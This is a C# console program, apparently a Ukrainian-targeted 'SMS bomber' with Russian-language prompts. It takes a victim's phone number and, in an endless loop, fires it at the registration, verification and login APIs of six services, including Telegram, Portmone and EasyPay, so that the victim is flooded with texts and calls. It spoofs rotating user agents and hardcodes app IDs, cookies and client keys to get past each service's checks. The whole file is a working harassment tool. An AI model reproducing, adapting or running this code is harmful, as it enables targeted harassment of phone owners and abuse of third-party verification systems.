using System;
using System.Text;
using System.Net.Http.Headers;
using System.Text.RegularExpressions;

internal class envy{

    private static readonly Random random = new Random();
    private static readonly IReadOnlyList<string> userAgents = new List<string>
    {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    };

        static async Task Main(){
        Console.Title = "B O M B E R";
        Console.OutputEncoding = Encoding.UTF8;

        Console.Write("АВТОР ЭТОГО ЧУДА\nhttps://envy0xc0.com (RUSLAN BULATOV)\nВведите номер телефона, в формате: 0631244947: ");
        string phone = "38" + Console.ReadLine();

        if(!Regex.IsMatch(phone, @"^380\d{9}$")){
            Console.WriteLine("Неверный формат номера телефона. Пожалуйста, введите номер в формате: 0631244947.");
            Console.ReadKey();
            return;
        }

        Console.WriteLine($"Обработка номера {phone}...");
        await Task.Delay(2000);
        Console.WriteLine("Процесс завершен. Нажмите любую клавишу для активации атаки.");
        while (!Console.KeyAvailable){
            await Task.Delay(100);
        }
        Console.WriteLine("S T A R T E D");
        for(; ;){

            Task[] requests = new Task[]
            {

                SendRequestAsync("https://helsi.me/api/healthy/v2/accounts/send", HttpMethod.Post, $"{{\"phone\":\"{phone}\",\"platform\":\"PISWeb\"}}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://helsi.me/" },
                }),

                SendRequestAsync("https://auth2.multiplex.ua/login", HttpMethod.Post, $"{{\"login\":\"{phone}\"}}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://friends.multiplex.ua/" },
                    { "X-Mx-Source", "WEB-FRIENDS" },
                }),

                SendRequestAsync("https://api.portmone.com.ua/auth/v2/registration", HttpMethod.Post, $"{{\"client_id\": \"62608e08adc29a8d6dbc9754e659f125\",\"scope\": \"https://api.portmone.com.ua/auth/client\",\"username\": \"{phone}\",\"password\": \"sdfdfsdfs2323few\",\"email\": \"adsadsasd2211@gmail.com\",\"verificationType\": \"phone_call\",\"attribute1\": \"\\u0420\\u0435\\u0433\\u0438\\u0441\\u0442\\u0440\\u0430\\u0446\\u0438\\u044f \\u043d\\u0430 \\u0441\\u0430\\u0439\\u0442\\u0435 www.portmone.com https://www.portmone.com.ua/auth#signup\",\"verification_required\": true}}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://www.portmone.com.ua/" },
                    { "X-App-Uid", "a4242cb9e57b84ff73ed5061b296ece6" },
                }),

                SendRequestAsync("https://bi.ua/api/v1/accounts", HttpMethod.Post, "{\"grand_type\":\"call_code\",\"stage\":\"1\",\"login\":\"амогус\",\"phone\":\"" + phone + "\"}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://bi.ua/ukr/signup/" },
                    { "Language", "uk" },
                    { "Authorization", "Bearer null" },
                    { "Cookie", "advanced-frontend=hdpepdrvghor7912u25i77bv6u; _csrf-frontend=bc0a155f4a22546aea0485eb780398e6b932acb89cb6f70e333b467ee8c4cdc1a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22QZ3UXDo7flFSnsEPvb6cmPJUk5oGBk7L%22%3B%7D" }
                }),

                SendRequestAsync("https://auth.easypay.ua/api/check", HttpMethod.Post, $"{{\"phone\": \"{phone}\"}}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://easypay.ua/" },
                    { "appid", "e63b0537-bf15-453f-8a02-d49f85261e61" },
                    { "pageid", "663b83ef-bfe9-47d9-809b-98784d37a12c" },
                    { "partnerkey", "easypay-v2" },
                }),

                SendRequestAsync("https://my.telegram.org/auth/send_password", HttpMethod.Post, $"phone=+{phone}", "application/x-www-form-urlencoded", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "X-Requested-With", "XMLHttpRequest" }
                })
            };
            await Task.WhenAll(requests);
            GC.Collect();
        }
    }

    public static string GenerateUserAgent(){
        return userAgents[random.Next(userAgents.Count)];
    }

    static async Task SendRequestAsync(string url, HttpMethod method, string data, string mediaType, Dictionary<string, string> headers)
    {

        using (HttpClient httpClient = new HttpClient()){
            httpClient.Timeout = TimeSpan.FromSeconds(3);
            HttpRequestMessage httpRequest = new HttpRequestMessage(method, url);
            httpRequest.Content = new StringContent(data);
            httpRequest.Content.Headers.ContentType = new MediaTypeHeaderValue(mediaType);
            foreach (var header in headers){
                httpRequest.Headers.Add(header.Key, header.Value);
            }
            try{
                HttpResponseMessage httpResponse = await httpClient.SendAsync(httpRequest);
                string content = await httpResponse.Content.ReadAsStringAsync();
            }
            catch (TaskCanceledException){
                Console.WriteLine($"[{httpRequest.RequestUri.Host}] Превышено время ответа сервера.");
            }
            catch (Exception e){
                Console.WriteLine($"[{httpRequest.RequestUri.Host}] Ошибка: {e.Message}");
            }
        }
    }
}